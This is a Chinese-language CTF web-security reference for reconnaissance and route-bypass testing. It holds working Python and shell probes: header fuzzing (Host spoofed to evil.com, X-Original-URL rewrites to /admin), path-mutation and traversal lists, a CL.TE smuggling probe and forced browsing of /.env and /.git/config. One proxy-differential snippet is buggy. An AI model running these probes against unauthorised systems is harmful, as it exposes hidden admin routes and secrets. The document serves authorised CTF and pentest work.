# Recon & 路由绕过

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/01-recon/recon-routing.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「Header Fuzzing / 路径绕过 / HTTP Method / 代理差异」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- Header Fuzzing
- 路径绕过
- HTTP Method
- 代理差异
- 指纹识别
- 参数发现
- dirsearch
- API Schema

## 前置

- 前置：目标可达；测试时段与限速已约定（打快了会把自己变成 DoS）。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。

## 步骤

本文正文按下列小节顺序推进，**每一步的完整命令与脚本在「技术正文」对应小节里**（这类文档以代码体 + 表格为主，按小节读比按 bullet 读快）：

1. 路由判定矩阵
2. Surface Router 脚本
3. Header Fuzzing 套件
4. 路径绕过字典
5. HTTP Method 矩阵
6. 代理/CDN 差异检测
7. 技术栈指纹
8. 强制浏览常见隐藏路径
9. 参数发现
10. API Schema 提取
11. 工作流 — 建立 HTTP baseline → 枚举路由/参数/版本信号 → 交叉验证指纹 → kb_router 选技术分支 → 最小 probe → 证据落盘。

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **输入信号** — 首页/JS 里出现 `/api/`, `/admin`, `/internal`, `/debug`, `/graphql`, `/swagger`
- **输入信号** — `401/403/405` 多于 `404`，说明路由存在但被鉴权、方法或代理层卡住
- **输入信号** — CDN/反代响应与源站响应不一致：`Server`, `Via`, `X-Cache`, `Location`, body hash 有差异
- **输入信号** — 同一路径在大小写、分号、双斜杠、编码路径下表现不同
- **输入信号** — 前端 bundle 暴露隐藏参数、feature flag、灰度 API 或老版本 API
- **Evidence** — 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- **Evidence** — 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- **Evidence** — 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
- **Evidence** — 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
- **Evidence** — `route_surface.json`: path、method、headers、status、len、hash、location、server。
- **Evidence** — 成功样本: 单变量改动导致原本不可达路由返回业务 JSON、后台页面、flag 或更具体错误。
- **Evidence** — 失败样本: 所有变体同 hash，说明被边缘层统一拦截；转 Cloudflare/CDN 或版本指纹。

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

## 输入信号

- 首页/JS 里出现 `/api/`, `/admin`, `/internal`, `/debug`, `/graphql`, `/swagger`
- `401/403/405` 多于 `404`，说明路由存在但被鉴权、方法或代理层卡住
- CDN/反代响应与源站响应不一致：`Server`, `Via`, `X-Cache`, `Location`, body hash 有差异
- 同一路径在大小写、分号、双斜杠、编码路径下表现不同
- 前端 bundle 暴露隐藏参数、feature flag、灰度 API 或老版本 API

## 0. 路由判定矩阵

| 信号 | 直接动作 | 命中样本 | 下一跳 |
|------|----------|----------|--------|
| `403` 但 body 稳定 | 变换 method/header/path | `403 -> 200/302/JSON error` | BAC/IDOR/后台 |
| `405 Method Not Allowed` | 跑 method matrix | `GET 405, POST 200` | API action |
| `Location` 使用 Host | Host/XFH 注入 | 跳转到攻击者 host | host-header |
| `X-Original-URL` 生效 | 改写到 `/admin`/`/flag` | 返回目标路由内容 | proxy bypass |
| `/.git`, `.env`, lockfile | 静态文件候选扫描 | 文件内容可读 | config/database |
| `/graphql` 只返回错误 | introspection/batch/alias | schema 或 field suggestion | graphql |
| `/swagger`/OpenAPI | 解析 endpoints/params | 私有 API 路由 | route fuzz |

## 0.1 Surface Router 脚本

```python
import hashlib
import itertools
import json
import requests

PATHS = ["/admin", "/api", "/api/me", "/graphql", "/swagger.json", "/.env", "/flag"]
METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
HEADERS = [
    {},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-HTTP-Method-Override": "PUT"},
]

def sig(resp):
    head = resp.text[:2048].encode(errors="ignore")
    return {
        "status": resp.status_code,
        "len": len(resp.text),
        "hash": hashlib.sha256(head).hexdigest()[:12],
        "location": resp.headers.get("Location", ""),
        "server": resp.headers.get("Server", ""),
        "content_type": resp.headers.get("Content-Type", ""),
    }

def route_surface(base):
    s = requests.Session()
    rows = []
    for path, method, hdr in itertools.product(PATHS, METHODS, HEADERS):
        try:
            r = s.request(method, base.rstrip("/") + path, headers=hdr, timeout=8, allow_redirects=False)
        except requests.RequestException as e:
            rows.append({"path": path, "method": method, "headers": hdr, "error": str(e)})
            continue
        item = {"path": path, "method": method, "headers": hdr, **sig(r)}
        if item["status"] in (200, 201, 202, 302, 401, 403, 405, 500):
            rows.append(item)
    print(json.dumps(rows, ensure_ascii=False, indent=2))
```

## Header Fuzzing 套件

```python
# recon_headers.py — 批量探测路由/代理绕过 header
import requests

TARGET = "https://target.com"

# 标准 header 篡改列表
HEADER_PROBES = {
    # Host 头攻击
    "Host": ["target.com", "evil.com", "127.0.0.1", "localhost",
             "target.com:80", "target.com@evil.com"],
    # 代理转发头
    "X-Forwarded-Host": ["evil.com", "localhost", "127.0.0.1"],
    "X-Forwarded-For": ["127.0.0.1", "0.0.0.0"],
    "X-Real-IP": ["127.0.0.1"],
    "X-Original-URL": ["/admin", "/flag", "/../", "/"],
    "X-Rewrite-URL": ["/admin", "/flag"],
    # Method override
    "X-HTTP-Method-Override": ["PUT", "DELETE", "PATCH"],
    "X-HTTP-Method": ["PUT"],
    "_method": ["PUT", "DELETE"],
    # Content-Type 绕过
    "Content-Type": [
        "application/json", "application/xml",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
    ],
}

def fuzz_headers(target_url: str, endpoint: str = "/api/me"):
    """对目标端点批量测试 header 注入"""
    baseline = requests.get(target_url + endpoint)
    print(f"[*] Baseline: {baseline.status_code} {len(baseline.text)} bytes")

    for header, values in HEADER_PROBES.items():
        for value in values:
            resp = requests.get(target_url + endpoint,
                headers={header: value})
            if resp.status_code != baseline.status_code:
                print(f"  [!] {header}: {value} → {resp.status_code}")
            if resp.text != baseline.text:
                diff = len(resp.text) - len(baseline.text)
                print(f"  [?] {header}: {value} → body diff {diff:+d} bytes")
```

## 路径绕过字典

```python
# 快速路径变异
PATH_MUTATIONS = lambda p: [
    p,                          # /admin
    p + "/",                    # /admin/
    p + ".json",               # /admin.json
    p + ".php",                # /admin.php
    p + ".asp",                # /admin.asp
    p + ".aspx",               # /admin.aspx
    p + ";.json",              # /admin;.json (Spring)
    p + "..;/",                # /admin..;/ (Tomcat)
    "//" + p,                  # //admin
    "/./" + p,                 # /./admin
    p.upper(),                 # /ADMIN (IIS 不区分大小写)
    p + "%00",                 # /admin%00
    p + "%20",                 # /admin%20
    p + "%23",                 # /admin%23 (#)
    p + "%3f",                 # /admin%3f (?)
    p + ".html",               # /admin.html
    p + ".bak",                # /admin.bak (备份文件)
    p + "~",                   # /admin~ (备份文件)
    p.replace("/", "/%2e%2e/"),# 路径穿越编码
]
```

## HTTP Method 矩阵

```bash
# 批量测试所有 HTTP 方法
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do
  echo -n "$method → "
  curl -s -o /dev/null -w "%{http_code}" -X $method "$TARGET/api/user"
  echo ""
done
```

## 代理/CDN 差异检测

```python
# 探测前端代理与后端差异
def detect_proxy_differential(target: str):
    """CL/TE 不一致、路径解析差异"""
    tests = {
        # CL.TE smuggling probe
        "smuggle_cl_te": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "6",
            "body": "0\r\n\r\nG"
        },
        # 路径规范化差异
        "path_norm": "/%2e%2e/admin",     # → /admin ??
        "path_encoded": "/foo/..%2fadmin", # 取决于谁先解码
        "path_null": "/admin%00.jpg",      # NUL 截断
    }
    for name, config in tests.items():
        if "body" in config:
            r = requests.post(target + config["path_norm"],
                headers={k:v for k,v in config.items() if k!="body"},
                data=config["body"])
        else:
            r = requests.get(target + config)
        print(f"  {name}: {r.status_code}")
```

## 技术栈指纹

```python
def fingerprint_stack(target: str):
    """从 HTTP 头秒读技术栈"""
    r = requests.get(target)
    h = r.headers

    sigs = {
        "Server": h.get("Server", ""),
        "X-Powered-By": h.get("X-Powered-By", ""),
        "Set-Cookie": h.get("Set-Cookie", ""),
        "X-AspNet-Version": h.get("X-AspNet-Version", ""),
        "X-Drupal-*": h.get("X-Drupal-Cache", ""),
    }

    FRAMEWORKS = {
        "Express": "X-Powered-By: Express",
        "PHP": "X-Powered-By: PHP/" in sigs["X-Powered-By"],
        "ASP.NET": "X-AspNet-Version" in sigs or "ASP.NET" in sigs["X-Powered-By"],
        "Django": "csrftoken" in sigs["Set-Cookie"],
        "Laravel": "laravel_session" in sigs["Set-Cookie"],
        "Spring": "JSESSIONID" in sigs["Set-Cookie"],
        "Flask": "Werkzeug" in sigs["Server"],
        "Nginx": "nginx" in sigs["Server"].lower(),
        "Cloudflare": "cloudflare" in sigs["Server"].lower(),
        "AWS": "awselb" in sigs["Set-Cookie"].lower(),
    }
    return {k: v for k, v in FRAMEWORKS.items() if v}
```

## 强制浏览常见隐藏路径

```bash
# 拼接常见后台/调试路径
endpoints=(
  /admin /administrator /wp-admin /manage /dashboard
  /api /api/v1 /api/v2 /graphql /graphiql
  /.env /.git/config /package.json /composer.json
  /actuator /actuator/health /actuator/env /actuator/mappings
  /swagger-ui.html /api-docs /v2/api-docs /v3/api-docs
  /phpinfo.php /info.php /server-status /server-info
  /debug /debug/default /test /dev /staging
  /backup /backups /old /archive /bak
  /console /_debugbar /profiler /metrics
  /robots.txt /sitemap.xml /crossdomain.xml
  /source /src /code /.git /.svn /.hg
  /docker-compose.yml /Dockerfile /Jenkinsfile
)
for ep in "${endpoints[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$ep")
  [[ $code =~ ^(200|301|302|403|405) ]] && echo "$code $ep"
done
```

## 参数发现

```bash
# Arjun — 参数爆破
arjun -u "https://target.com/page" --get
arjun -u "https://target.com/api" --post

# ParamMiner (Burp 插件) — 从响应中猜参数

# 手动: 从 JS bundle 提取参数
curl -s "https://target.com/app.js" | grep -oP '(?<=["'\''])\w+(?=["'\''])' | sort -u

# ffuf 参数 FUZZ
ffuf -u "https://target.com/api?FUZZ=test" -w params.txt -fs 0
ffuf -X POST -u "https://target.com/api" -d 'FUZZ=test' -w params.txt
```

## API Schema 提取

```bash
# 从 JS source maps 恢复源码
# 如果找到 app.js.map → 用 source-map 库解析
npx source-map-resolve app.js app.js.map

# 常见的 API 定义文件
curl -s "https://target.com/openapi.json"
curl -s "https://target.com/api-docs/swagger.json"
curl -s "https://target.com/swagger-resources"
```

## 工作流

建立 HTTP baseline → 枚举路由/参数/版本信号 → 交叉验证指纹 → `kb_router` 选技术分支 → 最小 probe → 证据落盘。


## Evidence

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
- `route_surface.json`: path、method、headers、status、len、hash、location、server。
- 成功样本: 单变量改动导致原本不可达路由返回业务 JSON、后台页面、flag 或更具体错误。
- 失败样本: 所有变体同 hash，说明被边缘层统一拦截；转 Cloudflare/CDN 或版本指纹。
